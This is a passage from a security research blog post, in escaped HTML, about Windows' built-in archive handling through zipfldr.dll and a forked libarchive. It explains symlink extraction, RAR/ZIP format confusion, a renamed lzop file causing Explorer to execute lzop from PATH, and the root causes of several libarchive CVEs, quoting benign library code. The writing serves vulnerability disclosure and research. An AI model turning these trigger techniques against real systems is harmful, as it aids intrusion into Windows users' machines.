&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Moreover, Windows determines the file type within the archive based solely on the file extension, which can be highly misleading. For example, in this case, our symlink file was recognized as a Text Document:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; uses the &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-createsymboliclinka&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateSymbolicLinkA&lt;/code&gt;&lt;/a&gt; API to create a symlink during decompression. Although this API requires elevated privileges, File Explorer wonâ€™t prompt for privilege escalation and will simply display an error message instead.
&lt;img src=&quot;/assets/img/blog/20250212/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Even though File Explorer adds the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE&lt;/code&gt; flag when using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateSymbolicLinkA&lt;/code&gt;, the documentation states that Developer Mode must be enabled for this flag to take effect.
&lt;img src=&quot;/assets/img/blog/20250212/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The â€œextracting symlink from archiveâ€ feature appears to be incomplete, limiting the vulnerability to attacks targeting administrators or developers. As a result, it does not meet MSRCâ€™s threshold for immediate servicing. Therefore, they will not provide ongoing updates on the status of the fix and have closed this case.&lt;/p&gt;

&lt;h2 id=&quot;libarchive&quot;&gt;Libarchive&lt;/h2&gt;

&lt;p&gt;In the previous section, we mentioned thatÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt;Â is responsible for handling interactions with the â€œCompressed (zipped) Folderâ€ and â€œCompressed Archive Folder.â€&lt;/p&gt;

&lt;p&gt;In this section, weâ€™ll talk about theÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archiveint.dll&lt;/code&gt;, which is actually a forked version of libarchive. Libarchive is a powerful, open-source library for handling archive file formats. It is used across multiple operating systems like Linux, BSD, and macOS, as well as in projects such as ClickHouse, Homebrew, and Osquery. Googleâ€™s OSS-Fuzz project has continuously fuzzed it 24/7 since 2016, making it a time-tested library.&lt;/p&gt;

&lt;p&gt;By black-box testing, we observed several interesting behaviors.&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-1-windows-supports-file-formats-more-than-they-claimed&quot;&gt;Fun Fact 1: Windows Supports File Formats More Than They Claimed&lt;/h3&gt;

&lt;p&gt;Although Microsoft claimed to have added native support for the following 11 archive formats in the KB5031455 update, the actual number of supported file formats far exceeds 11.
&lt;img src=&quot;/assets/img/blog/20250212/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is how Windows initialize libarchive in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt;:
&lt;img src=&quot;/assets/img/blog/20250212/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_all&lt;/code&gt; function in libarchive enables support for a total of 13 archive formats, including ar, cpio, lha, mtree, tar, xar, warc, 7zip, cab, rar, rar5, iso9660, and zip; theÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt;Â function in libarchive enables support for a total of 13 filters, including bzip2, compress, gzip, lzip, lzma, xz, uu, rpm, lrzip, lzop, grzip, lz4, zstd.&lt;/p&gt;

&lt;p&gt;In addition, format and filer can be used simultaneously. For example, the tar format and gzip filter should be enabled to supportÂ the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.tar.gz&lt;/code&gt;Â file format. So, the total number of Windowsâ€™ natively supported file formats isÂ 13+13+13Ã—13=195 ?&lt;/p&gt;

&lt;p&gt;Completely wrong! A maximum of 25 filters can be chained, e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive.rar.gzip.xz.uu.zstd.uu......&lt;/code&gt;. That said, Windows 11 actually supportsÂ 13+13+13Ã—13Â²âµÂ types of file formats, which equalsÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;91733330193268616658399616035&lt;/code&gt;Â formats! For free!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As a result, the attack surface has significantly expanded after the update. Any vulnerability in a file format within libarchive can be triggered on Windows. Additionally, parsing multiple filters simultaneously could also introduce security weaknesses.&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-2-file-format-confusion&quot;&gt;Fun Fact 2: File Format Confusion&lt;/h3&gt;

&lt;p&gt;When calling libarchive to decompress files, there is no need to specify the archiveâ€™s file format; libarchive automatically determines the format based on the content. However, there is a chance that File Format Confusion can happen when ZIP support is enabled. For example, if we create a demo3.rar archive and place a poc.zip file inside, the result will look like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we double-click demo3.rar directly on Windows, we will find that only the poc2.txt file is visible, while the other folders, files, and even poc.zip are missing. This is because libarchive mistakenly identifies demo3.rar as a ZIP file!&lt;/p&gt;

&lt;p&gt;To understand the bug, letâ€™s see how libarchive determines the file format for an archive. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;choose_format&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; function of the enabled formats is called, and the format whose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; returns the highest value is the one libarchive will treat the file as.
&lt;img src=&quot;/assets/img/blog/20250212/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Take &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ar&lt;/code&gt;â€™s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; function, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_format_ar_bid&lt;/code&gt;, for example, if the beginning 8 bytes of an archive is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;!&amp;lt;arch&amp;gt;\n&quot;&lt;/code&gt;, the function will return 64, which should be derived from 8ğ‘ğ‘–ğ‘¡ğ‘  Ã— 8ğ‘ğ‘¦ğ‘¡ğ‘’ğ‘  = 64
 :
&lt;img src=&quot;/assets/img/blog/20250212/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, the RAR formatâ€™s highest score is only 30. Although itâ€™s unclear how the number was determined, if each file format is checked starting from the beginning of the file, it should be difficult to create a polyglot that would break this mechanism, right?
&lt;img src=&quot;/assets/img/blog/20250212/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But, there is a special mode for ZIP in libarchive: seekable. In other words, the ZIP signature does not need to be at the beginning of the file; libarchive will search for it itself. The highest value for a seekable ZIP is 32:
&lt;img src=&quot;/assets/img/blog/20250212/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The consequence is that when a RAR archive contains a ZIP file and the RARâ€™s compression ratio is low enough to leave the ZIP signature untouched, libarchive will incorrectly treat the RAR file as a ZIP file.&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-3-sometimes-libarchive-tries-to-spawn-an-external-executable&quot;&gt;Fun Fact 3: Sometimes, Libarchive Tries to Spawn an External Executable&lt;/h3&gt;

&lt;p&gt;By reviewing the source code of libarchive, we found that if some libraries are missed during compiling, libarchive will change its behavior from using the library to executing commands to decompressing the archive:
&lt;img src=&quot;/assets/img/blog/20250212/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we decompiled the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archiveint.dll&lt;/code&gt;, which is the forked libarchive on Windows. We confirmed that the function for decompressing some file formats will try to execute the external binary, e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop_bidder_init&lt;/code&gt;:
&lt;img src=&quot;/assets/img/blog/20250212/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Plus, â€œlibarchive decides which format to use for extraction based on the file content,â€ all we need to do is change the extension of an lzop compressed file to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rar&lt;/code&gt;, and double-click it to trigger the corresponding lzop extraction function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop_bidder_init&lt;/code&gt;:
&lt;img src=&quot;/assets/img/blog/20250212/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the end, weâ€™ll see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt; is trying to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt; to decompress the archive:
&lt;img src=&quot;/assets/img/blog/20250212/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;rces-reported-by-morse-cve-2024-20696-and-cve-2024-20697&quot;&gt;RCEs Reported by MORSE: CVE-2024-20696 and CVE-2024-20697&lt;/h3&gt;

&lt;p&gt;So far, itâ€™s clear that libarchive introduces numerous attack surfaces. In fact, Windows also patched two vulnerabilities reported by Microsoftâ€™s Offensive Research Security Engineering (MORSE) team in January 2024, specifically the RCE vulnerabilities &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20696&quot;&gt;CVE-2024-20696&lt;/a&gt; and &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20697&quot;&gt;CVE-2024-20697&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;cve-2024-20696-oob-write-in-copy_from_lzss_window_to_unp&quot;&gt;CVE-2024-20696: OOB Write in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window_to_unp&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;While extracting RAR files, the fourth argument of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window_to_unp&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt;, is calculated based on the state after lzss decompression, representing the copy length. However, it was incorrectly defined as an int. This mistake allows an attacker to manipulate the lzss data, causing length to become a negative value, bypassing validation checks, and resulting in an out-of-bounds write vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2024-20697-oob-write-in-execute_filter_e8&quot;&gt;CVE-2024-20697: OOB Write in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;Itâ€™s also a vulnerability that happens when extracting RAR files. If an RAR file contains an e8 filter, libarchive will run into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt; function. (the filter here is defined by RAR, not the filter of libarchive we mentioned earlier)
The problem is that although there is a check in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt; to ensure the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; is larger or equal to 4, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; will be used in a for loop for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length-5&lt;/code&gt;. So, when the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; is 4, the loop will run 0x100000000 times, causing an out-of-bounds write.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;fuzzing-why-oss-fuzz-never-found-these&quot;&gt;Fuzzing: Why OSS-Fuzz Never Found These?&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To reproduce these two CVEs, we must construct RAR files, which is time-consuming. In CVE-2024-20696, we have to construct data of lzss that causesÂ the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt;Â to become a negative number; in CVE-2024-20697, we have to put an e8 filter in an RAR archive. Instead of building RAR bytes by bytes, we chose to collect RAR archives, especially those with the e8 filter, and feed them to the AFL++ fuzzer. To our surprise, it only took 56 seconds to find the first crash for CVE-2024-20697:
&lt;img src=&quot;/assets/img/blog/20250212/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Itâ€™s great that the crash happened quickly, but hereâ€™s the big problem: OSS-Fuzz has been Fuzzing libarchive 24/7 since at least 2016, so how can a vulnerability found in 56 seconds not be discovered yet?
&lt;img src=&quot;/assets/img/blog/20250212/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the OSS-Fuzz summary for libarchive, we can see that in June 2024, the code coverage of libarchive was only 15.03%:
&lt;img src=&quot;/assets/img/blog/20250212/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And seems it has lasted a long time:
&lt;img src=&quot;/assets/img/blog/20250212/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the file view, it is obvious that some file formats are basically untested. For example, the coverage of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_rar.c&lt;/code&gt; is only 4.07%:
&lt;img src=&quot;/assets/img/blog/20250212/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;the-answer-revealed&quot;&gt;The Answer Revealed&lt;/h4&gt;

&lt;p&gt;While preparing our talks, we noticed a pull request in the libarchive repository. It turns out that though they enabled theÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DONT_FAIL_ON_CRC_ERROR&lt;/code&gt;Â flag for CMake while compiling libarchive for OSS-Fuzz, they didnâ€™t define that option in CMake!?
&lt;img src=&quot;/assets/img/blog/20250212/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DONT_FAIL_ON_CRC_ERROR&lt;/code&gt; flag allowed libarchive to continue processing a file even when the CRC check failed. As we all know, fuzzers are generally poor at generating correct checksums. This means that the long-term low coverage of OSS-Fuzz was due to the fuzzerâ€™s inability to produce valid CRC values to pass the checks.&lt;/p&gt;

&lt;p&gt;After the fix, a significant improvement in OSS-Fuzzâ€™s coverage of libarchive can be observed, increasing from 15.03% to 63.10%:
&lt;img src=&quot;/assets/img/blog/20250212/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the file view, the code coverage for individual file formats is also improved:
&lt;img src=&quot;/assets/img/blog/20250212/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;keep-fuzzing&quot;&gt;Keep Fuzzing&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While conducting the code review, we kept AFL++ working for us. At the end of our research, the fuzzer found two out-of-bound read vulnerabilities: CVE-2024-48957 and CVE-2024-48958.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-26256-libarchive-remote-code-execution-vulnerability&quot;&gt;CVE-2024-26256: Libarchive Remote Code Execution Vulnerability&lt;/h3&gt;

&lt;p&gt;After analyzing the vulnerabilities, CVE-2024-20696 and CVE-2024-20697, found by Microsoft, we found they are both in theÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_rar.c&lt;/code&gt; and both in the newly added functions within the previous three years.
&lt;img src=&quot;/assets/img/blog/20250212/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We decided to review RAR to investigate whether there are any other vulnerabilities. The first thing we wanted to understand was what filter_e8 refers to in CVE-2024-20697 and what the â€œfilterâ€ mentioned in the commit message â€œsupport RAR filtersâ€ means.&lt;/p&gt;

&lt;h4 id=&quot;the-vm-in-rar&quot;&gt;The VM in RAR&lt;/h4&gt;

&lt;p&gt;To understand &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_e8&lt;/code&gt;, we must know that there is a VM in RAR! There is actually a register-based VM in RAR. The VM can be used to run a custom program to improve the compression ratio of an RAR file.&lt;/p&gt;

&lt;p&gt;When creating an RAR file, a custom â€œfilterâ€ program can be included. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_e8&lt;/code&gt; is one such program, designed to improve the compression ratio for Intel binaries. The â€œe8â€ in its name refers to the near call opcode in the Intel instruction set.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But what is the correlation between call instruction and improved compression ratio?&lt;/p&gt;

&lt;p&gt;Take the following small program as an example: if there are two &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; instructions that will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;funcA&lt;/code&gt;, located at addresses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; respectively, we can see in the machine code that the near &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; instruction starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xe8&lt;/code&gt;, followed by 4 bytes, which corresponds to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; in the manual. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; value represents the relative offset between the address of the target function and the address of the instruction following the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; instruction. For example, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; value of the first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; instruction is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1b&lt;/code&gt;, which is calculated by subtracting the address of the next instruction (0+5) from the address of the target function (0x20):
&lt;img src=&quot;/assets/img/blog/20250212/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Both instructions are used to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;funcA&lt;/code&gt;, but due to their different machine code representations, the compression ratio is lower. However, since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; value can be easily calculated, it can be replaced with the absolute address of the target function, making the instructions identical and improving the compression ratio:
&lt;img src=&quot;/assets/img/blog/20250212/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While decompressing, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e8 filter&lt;/code&gt; will be used to recover the replaced &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To simplify the implementation, libarchive doesnâ€™t fully implement the entire VM. Instead, it simply calculates the fingerprint of the filter using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crc32&lt;/code&gt;. The relevant code can be found in &lt;a href=&quot;https://github.com/libarchive/libarchive/blob/42565b88b5cc7441239269902a9d1735fd9ca0e2/libarchive/archive_read_support_format_rar.c#L3826&quot;&gt;libarchive&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;execute_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;archive_read&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rar_filter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rar_virtual_machine&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1D0E06077D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x35AD576887&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_e8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x393CD7E57E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_e8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x951C2C5DC8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_rgb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xD8BC85E701&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execute_filter_audio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;archive_set_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ARCHIVE_ERRNO_FILE_FORMAT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;No support for RAR VM program filter&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

